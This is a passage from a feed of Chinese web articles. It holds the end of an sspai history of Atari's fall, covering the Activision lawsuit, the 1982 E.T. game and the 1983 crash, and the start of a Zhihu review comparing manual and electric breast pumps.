和在未经许可的情况下制作和发行游戏软件的行为属于犯罪，诉求勒令动视即刻停止一切侵权行为，并且支付高达两千万美元的赔偿金。</p>\n<p>显然，雅达利法务部没有迪士尼法务部的「超能力」，他们的如意算盘是动用「钞能力」，在赔偿金额上狮子大开口，以这种方法「哄抬」官司成本，企图以高额的诉讼费用拖垮对手。这样，动视即使胜诉，却也要付出一笔惨痛的代价，足以令其一蹶不振，永无翻身之地。然而，令雅达利想不到的是，动视的扩张速度远超他们的想象。</p>\n<h3>「谁有钱就挣谁的！」</h3>\n<p>时任动视 CEO 的吉姆·莱维（Jim Levy）此前曾从事出版行业，也有在唱片公司的工作经历，所以他的经营策略也更加偏向对游戏和开发者的包装，很有如今「饭圈」的那一套。莱维认为「游戏开发者也是艺术家」，也乐于给开发者以艺术家的待遇，动视发行的游戏会在包装盒上印刷开发者的签名照和寄语，并且还会介绍游戏开发的背景故事和幕后「花絮」。<strong>莱维的理念不仅激励了被雅达利长期压迫的游戏开发者，也促进了开发者与玩家在屏幕之外直接或间接的互动，改变了以往游戏行业照搬传统出版物进行宣发活动的老套做法</strong>。</p>\n<p>接下来的剧情似乎毫无悬念，1980 年 7 月，动视的四款首发游戏上市，在玩家间受到了前所未有的热烈欢迎，这家一开始只有八名员工的小公司在一年之内的收入高达 650 万美元，雅达利的计划在动视的成功面前不攻自破，此时摆在其面前的就只剩下了一条路。</p>\n<h3>「让子弹飞一会。」</h3>\n<p>事情到了这个地步，无论是对雅达利还是对动视来说，这场诉讼的结果都变得尤其重要。<strong>对于刚在游戏行业站稳脚跟的动视来说，赢得诉讼就等于名正言顺的拿到了市场准入的通行证；而对于财大气粗的雅达利来说，输掉诉讼就相当于为自己在市场的长期垄断刻下了墓志铭</strong>。商业竞争并无高尚和卑鄙之分，但如果比较动视和雅达利各自所处的地位和表现出的姿态，这场诉讼显然更像是屠龙者与恶龙之间的较量。</p>\n<p>1981 年 11 月，雅达利和动视之间漫长的官司终于落下帷幕，法院认为雅达利基于其市场支配地位、出于排除和限制竞争的目的所提出的诉求违反了反托拉斯法的相关规定，故驳回其诉求，宣判雅达利败诉。<strong>作为英美法系国家，美国的判例法制度源远流长，所以雅达利的败诉发出了一个极其重要的信号 —— 即任何人都可以在美国合法的开发和销售 Atari 2600 平台的游戏软件。</strong>诉讼结果让雅达利垄断下的游戏市场从此门户洞开，作为赢家的动视自然成为了受益方，但在判例之下，无数觊觎着雅达利财产的眼睛也开始蠢蠢欲动。</p>\n<h2>「旧日支配者」的「心思」有多坏？</h2>\n<p>几乎是在一夜之间，无数曾被雅达利拒之门外的游戏开发商「如闪电般归来」，并迅速展开了与雅达利的单方面「跨界联动」，企图在动视胜诉的「风口」上分一杯羹。虽然新晋的第三方游戏中不乏佳作，但这些优质游戏的数量相对于涌入市场的粗制滥造和鱼目混珠之作来说只是杯水车薪。在那个游戏媒体还不甚发达的年代，玩家们要判断一款游戏的优劣只能依靠口口相传，然而在面对几乎挤爆了货架的陌生游戏时，这种方法很快失去了使用价值。</p>\n<p>从此，买卡带变成了「开盲盒」，而玩家想要在如此恶劣的环境下买到一个质量还行的新游戏，其难度不亚于抽到盲盒的「隐藏款」。同时，一些包含暴力、血腥、色情元素，甚至带有强烈种族主义色彩和极端主义倾向的游戏都堂而皇之地出现在了雅达利的游戏机上，这口黑锅自然也一并被舆论扣在了雅达利的身上。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5au0jlb34teh5fkvebg.jpeg\"><figcaption>自雅达利败诉之后，Atari 2600 上充斥着各种滥竽充数之作。</figcaption></figure><p>从此，整个北美大陆的游戏市场开始了「劣币驱逐良币」的恶性循环，刚刚闯入陌生市场的游戏开发商学不会动视对游戏品质的严格把控，却在极短的时间内熟练掌握了动视在游戏宣发上的精髓。游戏卡带的包装越来越精美，故事越编越动人，IP 越来越重量级，游戏内容却越来越枯燥乏味，<s> 像极了现在的手游行业 </s> 。然而，面对已经开始失控的市场，雅达利依然不肯放下身段，而是转而制定了更加激进的策略。</p>\n<h3>「 I have a plan! A big! Plan! 」</h3>\n<p>为了转嫁矛盾，雅达利转而开始向销售网络中的分销商和零售商施压，逼迫这些商家订购超出需求的卡带数量，以消化过分积压的库存。但商家不是傻瓜，雅达利销售网络中的商家为了规避风险和扩大规模，也同时订购和销售第三方的卡带，这似乎构成了一种双赢的局面，看上去雅达利减轻了库存压力，第三方游戏开发商拓宽了销售渠道，所有人都很高兴 —— 除了玩家。</p>\n<p>不满的情绪开始在玩家群体中蔓延，但首先撑不住的不是玩家，而是商家。雅达利庞大的体量下近乎「恐怖」的产能和库存数量并非是向商家强行摊派就能解决的，况且雅达利此举的目的是为了更新自家的游戏阵容，从而保持对第三方游戏开发商的竞争力。因此，雅达利在消化库存的同时也在变本加厉的生产新的卡带，而与此同时，大量的第三方游戏依然在疯狂的涌入市场，所有卖不出去的卡带最后全部变成了压在商家身上的沉重负担。<strong>整个游戏市场就像暴雨中即将决堤的河流，无数的淘金者逆流而上，所有人都想在这条浑水中多捞一笔，却没有一个人发现那座即将溃于蚁穴的千里之堤</strong>。</p>\n<h3>「团长，车子已经准备好了！」</h3>\n<p>大家都很高兴的 1982 年一直高兴到了年末，然后就高兴不下去了。在雅达利第一方与第三方游戏的「通力协作」下，销售网络的承压能力和混乱程度已经达到了极限，雅达利不知道有多少商家依然在销售自己的游戏，而商家也不知道自己到底和雅达利等开发商签下了多少订单，可谓是「兵不识将，将不识兵」，宋太祖一定没想到自己的国策竟然被一千年以后的美国资本家给玩明白了。</p>\n<p>事情发展到如此地步，是个明眼人都已经看出了这其中的门道，商家开始将已订购的卡带做退货处理，但雅达利并未把退回的卡带从总销售额中扣除。这种人为营造的「虚假繁荣」进一步恶化了市场环境，粗制滥造的游戏已经泛滥成灾，玩家的情绪就像巴尔干半岛上的火药桶，但谁也没有想到，这一年的圣诞节则成为了半岛上的「萨拉热窝」。</p>\n<h2>「旧日支配者」的「终局」有多惨？</h2>\n<p>阿兰·摩尔（Alan Moore）的漫画《致命玩笑》中，小丑在 1985 年的圣诞夜用一支转轮手枪将芭芭拉打入了 ICU；而现实世界中，霍华德·斯科特·华沙（Howard Scott Warshaw）在 1982 年的圣诞夜用一部《E.T.》游戏把雅达利钉上了耻辱柱。</p>\n<p>由史蒂芬·斯皮尔伯格（Steven Allan Spielberg）执导，于1982 年 6 月上映的《E.T.》电影是科幻电影史上的里程碑。在流媒体尚未出现的 80 年代，这部电影的受欢迎程度远超如今的所谓互联网「顶流」。雅达利「最大的敌人」—— 时代华纳自然不会放过蹭这个 IP 的机会，为了拿到电影改编权，也为了顺道拯救雅达利的销量，时代华纳开始频繁与环球影业和斯皮尔伯格接触，因为雅达利此前制作过斯皮尔伯格的另一部电影《夺宝奇兵》的改编游戏，其销量和口碑都相当不错，所以时代华纳没费多大力气（<s>也就砸了 2000 万美元</s>）就拿到了《E.T.》电影的改编权。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c5au0jtb34teh3cl8mdg.jpeg\"><figcaption>从精美的《E.T.》游戏海报及其展示的包装封绘上可以看到时代华纳和雅达利对这款游戏的莫名自信。</figcaption></figure><h3>「致命玩笑」</h3>\n<p>雅达利上下对《E.T.》这个千载难逢的 IP 充满期待，为了表示诚意，雅达利高层决定让《夺宝奇兵》游戏的制作人霍华德负责这个项目。在 20 万美元薪酬和免费度假的许诺后，雅达利提出了唯一的要求：整个游戏要在五周之内开发完毕。</p>\n<p>摆在霍华德面前的只有两条路：要么拿着 20 万美元去夏威夷，要么抱着铺盖卷走人回家。虽然老板提出的要求实在过于阴间，但霍华德做出了一个碳基生物应有的选择。在霍华德夜以继日进行着开发工作的时候，时代华纳和雅达利正忙着为这部连他们自己都还不知道长什么样子的「旷世巨作」广而告之。报刊、杂志、广播、电视，甚至街边的商店橱窗商都挤满了《E.T.》游戏的广告，简直可以算作精神污染。</p>\n<p><strong>《E.T.》游戏从立项到完成的过程很像现在的一些现象级手游，开发商花重金砸下热门 IP，又极尽所能的为其造势铺路，唯独不肯在游戏开发上多下心思，其后的口碑和销量一落千丈直至黯然离场也是可以轻易预见的</strong>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5au0k5b34teh5fkvec0.png\"><figcaption>《E.T.》游戏的这口黑锅实在不该由开发者霍华德来背。</figcaption></figure><p>1982 年的圣诞节，《E.T.》游戏如期上架，雅达利没有像自己的电视广告里一样给全美国的孩子们一个大大的「Surprise」，而是以极为低劣的游戏质量给了所有人一个大大的「Surprise Mother F**ker」。<strong>有人认为《E.T.》游戏是开发者霍华德对雅达利的无声报复，实际上，《E.T.》游戏的完成度对于只有五周的开发时间来说已经相当之高，被称作「史上最烂游戏」并非完全出于对游戏质量的评价，主要原因还是因为其实机表现和广告宣传的强烈反差，以及百万销量带来的知名度</strong>。</p>\n<p>如果要客观的评价《E.T.》游戏，倒不如直接问问游戏行业的从业者。</p>\n<blockquote><p>要在五周时间内开发一款 3A 大作是什么样的体验？</p></blockquote>\n<h3>「凛冬将至」</h3>\n<p>玩家群体的怒火终于在 1982 年圣诞节的雪夜爆发，已经售出的上百万张卡带中有不少在当夜就已经「横尸街头」。过于乐观的雅达利对《E.T.》游戏的备货相当充足，在圣诞节前加急生产的四百万张卡带除去上述的一百万张之外，剩下的全部积压在商家的货架上和雅达利自己的仓库里，即使打折幅度堪比 Steam 特卖也依然没人买账。<strong>受够了「欺诈式营销」的玩家从此失去了对雅达利乃至整个游戏行业的最后一点信任，无数的游戏机和卡带在一夜之间变成了无人问津的电子垃圾；深感市场前景一片灰暗的投资方纷纷也与游戏产业一刀两断，既为亡羊补牢，也为明哲保身；而借此机会不断唱衰电子游戏的媒体则在舆论上声讨雅达利长久以来的无耻行径，持续数月的「饱和打击」之下，整个北美的游戏市场变得如同废土一般死寂</strong>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/01/552544fdf7b5fb2a50861eef3f4451b3.png\"><figcaption>雅达利的时代随着无数滞销的卡带一并，被人遗忘在了新墨西哥州阿拉莫戈多垃圾场的茫茫沙海之中。</figcaption></figure><p>在这场被命名为「雅达利冲击」的大崩溃中，雅达利既首当其冲，又难逃其咎。但是对于雅达利来说，数十亿的资产蒸发倒还是小事，此时最重要的是时代华纳的态度。但这位一手制造了当下局面的「始作俑者」并未显露出一丝愧疚，时代华纳只是瞟了一眼形如败犬的雅达利，就像雅达利瞟向那些曾为自己呕心沥血的开发人员一样。此时此刻，雅达利也只剩下了一句话。</p>\n<h2>「那我走？」</h2>\n<p>雅达利的崩溃直接导致了时代华纳的股价大跌，时任时代华纳 CEO 的史蒂夫·罗斯（Steve Ross）决定将雅达利拆分出售以缓解经营压力。曾经的雅达利从此一分为二，变成了雅达利集团和雅达利游戏，前者于 1984 年 7 月被出售给了 Commodore 的创始人杰克·特拉梅尔（Jack Tramiel），而后者则于 1985 年 2 月被南梦宫收购。归于南梦宫麾下的雅达利游戏并没有就此销声匿迹，在不久之后，这家脱胎于游戏巨头雅达利的「天选之子」将在大洋彼岸再次掀起游戏业界的一片腥风血雨 —— 不过，那就是另一个故事了。</p>\n<h2>参考文献</h2>\n<ul>\n<li><a href=\"https://www.163.com/ent/article/CM6PJUKU00318QE8.html\" target=\"_blank\">北美主机市场的崩溃，罪魁祸首竟是动视？</a></li>\n<li><a href=\"https://www.gcores.com/articles/131144\" target=\"_blank\">动视的四十一年（上）| 机核 GCORES</a></li>\n<li><a href=\"https://www.yystv.cn/p/958\" target=\"_blank\">史上最烂游戏表示：雅达利倒闭这个锅我不背 - 游研社</a></li>\n<li><a href=\"https://de.wikipedia.org/wiki/Atari\" target=\"_blank\">Atari – Wikipedia</a></li>\n<li><a href=\"https://de.wikipedia.org/wiki/Activision\">Activision – Wikipedia</a></li>\n<li>本文部分图片来自 <a href=\"https://www.gcores.com/\" target=\"_blank\">机核网</a> 与 <a href=\"https://zh.wikipedia.org/\">维基百科</a>\n</li>\n</ul>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派会员？<a href=\"https://sspai.com/prime\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69078"},{"title":"有没有好用的吸奶器推荐？","date":"2021-10-08 06:32:08","description":"\n<h3>测评完这些吸奶器，我感觉把娃奶到18岁都没问题了，哈哈哈！</h3>\n<p><img src=\"https://pic3.zhimg.com/v2-d28aef32c580051fd3aaa686a9d232fd_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1125\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>大家好！我是一直在母乳路上升级打怪的 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/0ba3b5679cf13f66a8c6c551a7b04437\" data-hash=\"0ba3b5679cf13f66a8c6c551a7b04437\" data-hovercard=\"p$b$0ba3b5679cf13f66a8c6c551a7b04437\">@YUNYA麻麻</a>，很荣幸成为知乎#翻牌众测 的吸奶器测评嘉宾。<b>本篇测评产品由知友提出，未接受任何品牌植入或合作邀约。</b></p>\n<p>本篇吸奶器测评价位从59元~10000元不等，包含手动吸奶器，电动吸奶器，以及手电一体吸奶器。</p>\n<p>测评方式，包含<b><u>主观体验感受</u></b>以及<b><u>客观测试结果</u></b>。我将尽量详细充分地向大家展示每款产品的特点，以便大家选出最适合自己的吸奶器产品。</p>\n<h2><b>Ⅰ 手动吸奶器</b></h2>\n<p>手动吸奶器我总共购买了5个品牌，分别为新贝、十月结晶、小雅象、美德乐、兰思诺。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-949dc1a2f84e339989222f0d2aafc06e_720w.jpg?rss\" data-rawwidth=\"673\" data-rawheight=\"204\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>除美德乐外，手动吸奶器普遍价格都在百元以内。兰思诺由于是手电一体机，所以价格在另外一个档位上。</p>\n<p>手动吸奶器相比电动吸奶器的优势在于它<b>1.价格便宜</b>，<b>2.非常轻便</b>，<b>3.操作起来没有任何噪音</b>。由于是自己的手去按压，所以力度堪称无极调节，4.很容易找到自己<b>舒适的力度</b>。但是它带来的缺点是，<b>手很累，效率低，耗时长</b>。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-cad58cda7307112443a11426e6e6512b_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1124\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>在这几款手动吸奶器的体验中，<b>美德乐以它最贵的价格在体验感上拔得头筹。</b>新贝和小雅象的价格差不多，实际体验也差异不是很大。下面我分别写一下每款吸奶器的使用感受：</p>\n<h3><b>一、美德乐和韵｜手动之神</b></h3>\n<p><b>美德乐手动吸奶器在这几个里面是最贵的，体验感也是最好的。适合有预算且需要手动吸奶器的妈妈。</b></p>\n<p>它的安装说明清晰明了，很适合新手妈妈操作。手柄握起来舒适顺滑，可以360度旋转，找到自己最喜欢的角度。按压短柄用于按摩,按压长柄用于深吸排乳。我在奶胀的时候测评，十分钟挤出了40ml，乳房基本被排空了，业务能力很可。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-af80ca18f39372f8a24eaf7e362d159b_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1124\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>喇叭罩外围是一圈硅胶材质，贴到乳房上也比较柔软亲肤。吸乳护罩支持21mm/24mm/27mm/30mm四种不同尺寸，选择算很多的。下单一般默认发24mm，这个也是最普遍的尺寸。</p>\n<p>但是它也有缺点！首先就是它有<b>1.清洁死角</b>，网上居然没人提！下图处是乳汁流向奶瓶的通道，狭长窄小还有转弯，很难洗到呀！需要买那种非常细小的吸管刷才能深入到里面，清洗并不方便。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-d7585d9377a2cb45bb5b3592d0ae85fc_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1124\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>其次是<b>2.奶瓶口是所有测评产品中最窄的</b>，海绵刷得用力才能挤进去清洗，不明白为什么美德乐要设计窄瓶口？有了解的可以留言告诉我，谢谢。最后<b>3.奶毫升刻度从50ml起标</b>，这个我作为奶渣妈妈表示不满。像我这种单边最多排40ml，30ml，甚至有时候发挥不好只能拔20ml的妈妈就不配拥有精准测量的权利么（哭泣）~很多妈妈并不是一开始使用吸奶器就有很多奶的哦！建议美德乐品牌可以考虑增加一些50ml以下刻度的精准测量，多印几行字花不了几个钱，但是能换妈妈们攀爬奶量时“可确认”的开心~</p>\n<p><img src=\"https://pic2.zhimg.com/v2-acc513deb732af444cd0a658a133f960_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1124\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>❤️<b>吸力演示</b></p>\n<blockquote>用注水气球模拟乳房，展示吸吮情况。</blockquote>\n<p><img src=\"https://pic3.zhimg.com/v2-8f31a3a3b884e01f84fd818e34c3ad9c_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"540\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>❤️客观吸奶量</b></p>\n<blockquote>用奶瓶装满水模拟吸奶，用吸奶器吸水1分钟，记录最终的吸奶量。</blockquote>\n<p><img src=\"https://pic2.zhimg.com/v2-7408ccd2ebc414728afad0340a97e7d5_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"539\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><i>测评结果：1分钟≈30ml （家庭实验结果仅供参考）</i></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1428742238587633664\"></a><h3><b>二、新贝手动吸奶器</b></h3>\n<p>我很认可它家本次测评的电动吸奶器，这个后面详写。<b>手动吸奶器表现中规中矩</b>，不过毕竟价格也只需要59元，倒也不亏。我在奶胀的时候测评，十分钟挤出了30ml，乳房不算排得很空，业务能力打个良好吧。<b>适合有一定预算限制，对吸奶器也没特别需求的妈妈。</b></p>\n<p>它不用自行安装，新手妈妈买来基本就能用了。而且它配了一副多触点的硅胶按摩乳罩，可以在吸奶的同时，通过按摩乳房周边的乳腺，改善涨奶疼痛。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-1365fe6b59058542b5d9814572c06d06_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1124\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>新贝手动吸奶器还一个有心之处是，附赠了奶嘴。排出奶后直接盖上奶嘴就能给宝宝喝了，而不是像其他几款产品还得倒出来装到另外的奶瓶里。妈妈们每次少洗一个奶瓶看起来没什么，累积起来的量是非常令人愉悦的。而且没有清洗死角。乳汁留向奶瓶的通道不算狭窄，奶嘴刷就能洗到。</p>\n<p>但令我费解的是，为什么要加一个<b>1.垫圈</b>呢？嵌在里面每次很难取出来。是为了密封性能好吗？那为什么很多其他品牌可以不用加呢？多1个垫圈妈妈们就需要多洗1个配件呀！另外就是<b>2.手柄按压起来不算很轻盈</b>，所以扣点分。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-b1e6ba0694e2c8dd0e3df91a6ef0aaa2_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1124\" data-size=\"normal\" data-caption=\"垫圈较难取出来\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>❤️<b>吸力演示</b></p>\n<blockquote>用注水气球模拟乳房，展示吸吮情况。</blockquote>\n<p><img src=\"https://pic1.zhimg.com/v2-92a1a32f9b97cba18bc0343d107b988d_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"539\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>❤️<b>客观吸奶量</b></p>\n<blockquote>用奶瓶装满水模拟吸奶，用吸奶器吸水1分钟，记录最终的吸奶量。</blockquote>\n<p><img src=\"https://pic3.zhimg.com/v2-5b0d42a4632b2b2fc32d7ef8bdd702d8_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"540\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><i>测评结果：1分钟≈25ml （家庭实验结果仅供参考）</i></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1428742549725409280\"></a><h3><b>三、十月结晶手动吸奶器</b></h3>\n<p>我对十月结晶的很多产品印象都很好，但这款手动吸奶器除外。有点恨铁不成钢：“人家术业有专攻，你在干啥呢？”总体来说，<b>暂时不太推荐购买</b>。</p>\n<p>它也是不需要安装的，新手妈妈买来基本就能用了，这点很好。也多加了硅胶护罩，但遗憾的是，我使用时并没感觉有被按摩到。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-612fcc6ea867d3664a7701a3e28da67d_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1124\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>此外，十月结晶的<b>1.手柄握压起来并不太顺滑</b>。同价位新贝和小雅象的手柄握压起来都非常平滑，有“无极调节”的感觉。但十月结晶的握压起来，会有顿挫感。不知道是不是与上盖设计的回弹气囊有关，整体上<b>2.体验感不佳</b>。</p>\n<p>它最大的优点是，完全没有清洁死角，所有角落都能清洗到！</p>\n<p>❤️<b>吸力演示</b></p>\n<blockquote>用注水气球模拟乳房，展示吸吮情况。</blockquote>\n<p><img src=\"https://pic4.zhimg.com/v2-de2361d6fac752d9c6f8c01f6b7a6360_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"540\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>❤️客观吸奶量</b></p>\n<blockquote>用奶瓶装满水模拟吸奶，用吸奶器吸水1分钟，记录最终的吸奶量。</blockquote>\n<p><img src=\"https://pic2.zhimg.com/v2-c22204d3200fc41027327547fe819f23_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"540\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><i>测评结果：1分钟≈20ml （家庭实验结果仅供参考）</i></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1428742836901113856\"></a><h3><b>四、小雅象奕轻手动吸奶器</b></h3>\n<p>小雅象这款产品有点创新，它打破了传统手动吸奶器不可调节吸力的弊端，<b>设有两档吸力调节，可以自己调节档位，控制吸奶的速度和力度</b>。我在奶胀的时候测评，十分钟挤出约30ml。<b>适合有一定预算限制，没什么额外需求并想追求外观的妈妈。</b></p>\n<p>它同样是免安装的，新手妈妈买来洗完就能用。小雅象在喇叭口设计了亲肤的小白圈，触感柔软贴合胸部曲线。它里面贴心地放了24mm和 28mm两个喇叭口，给了妈妈们更多的选择。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-8113efffc7544621b3db338f0c193691_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1124\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>这款吸奶器没有清洁死角，洁癖妈妈OK。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-9069904c464b167b1aff24b811f8f56a_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1124\" data-size=\"normal\" data-caption=\"虽然有垫圈，但垫圈很好取出\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>手柄握感柔软顺滑，但缺点是<b>1.相对其他几款按压起来没那么轻盈</b>，手要用到的力气会偏大一些，所以容易累些。</p>\n<p>另一个缺点是<b>2.奶水通道不是透明的</b>，它挡着了部分视线，看不到乳头出奶情况，少了些成就感。虽然可以通过下面的瓶身看到，但总体视觉上是不太习惯的。<b>3.它也有垫圈</b>，清洗会多一步，但是比新贝的好取出来些。</p>\n<p>❤️<b>吸力演示</b></p>\n<blockquote>用注水气球模拟乳房，展示吸吮情况。</blockquote>\n<p><img src=\"https://pic2.zhimg.com/v2-97ba8629d24cfdbca6fa33e0366c3a49_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"540\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>❤️客观吸奶量</b></p>\n<blockquote>用奶瓶装满水模拟吸奶，用吸奶器吸水1分钟，记录最终的吸奶量。</blockquote>\n<p><img src=\"https://pic4.zhimg.com/v2-9c830b693238df3151ba318b8c40c8ae_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"540\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><i>测评结果：1分钟≈25ml （家庭实验结果仅供参考）</i></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1428743125195624448\"></a><h3><b>五、兰思诺手电一体吸奶器</b></h3>\n<p>这款吸奶器最特别，它<b>既可以手动也可以电动，适合希望能一机多用的妈妈</b>。我在奶胀的时候测评，十分钟排出约30ml，吸力相对其他几款较小。虽然既定时间内没排空，但很舒适，我这种疼痛敏感型妈妈会比较喜欢。</p>\n<p>兰思诺手动吸奶器握起来非常轻盈舒适，是相对省力的一款。硅胶边缘可以很舒适地贴合妈妈的胸部。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-013204cdc270aadc4357a9fef68b68ef_720w.jpg?rss\" data-rawwidth=\"1998\" data-rawheight=\"1124\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>这款吸奶器也没有什么清洗死角，最狭长的部位用小奶嘴刷可以清洗到。</p>\n<p>因为它是手电一体，所以<b>1.安装起来相对其他几款较为复杂</b>。而且<b>2.居然没有安装视频</b>，只能靠翻阅说明书来拼装。新手妈妈如果没有吸奶器使用经验的话，首次使用可能会比较迷茫。</p>\n<p>❤️<b>吸力演示</b></p>\n<blockquote>用注水气球模拟乳房，展示吸吮情况。</blockquote>\n<p><img src=\"https://pic4.zhimg.com/v2-d4a3a3ebf7d03e0c6e9a16b04e611880_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"540\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>❤️客观吸奶量</b></p>\n<blockquote>用奶瓶装满水模拟吸奶，用吸奶器吸水1分钟，记录最终的吸奶量。</blockquote>\n<p><img src=\"https://pic3.zhimg.com/v2-12298c213afb0923899999cc191b6482_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"541\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><i>测评结果：1分钟≈30ml （家庭实验结果仅供参考）</i></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429720042312876032\"></a><p><b>五款手动吸奶器的展示就到这里。</b></p>\n<p>最后我想提醒下新手妈妈们，如果想买手动吸奶器，建议先考虑下三个问题。<u>1.自己奶量是否稳定；2.乳腺是否畅通；3.奶阵会不会比较容易刺激出来</u>。如果都“是”的话，手动吸奶器足以，效率也会比较高。<b>如果奶量本身不多，需要多刺激泌乳提升奶量的话，使用手动吸奶器就很耗费耐心，也比较劳累。所以我更推荐后者选择电动且双边的吸奶器。</b></p>\n<p>下面是本次电动吸奶器的测评。</p>\n<h2><b>Ⅱ 电动吸奶器</b></h2>\n<p>电动吸奶器我总共购买了6款，分别为兰思诺、新贝、新安怡、美德乐丝韵翼、贝瑞克、美德乐心韵。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-7885aa1cbca571958d138fb450809689_720w.jpg?rss\" data-rawwidth=\"794\" data-rawheight=\"203\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" 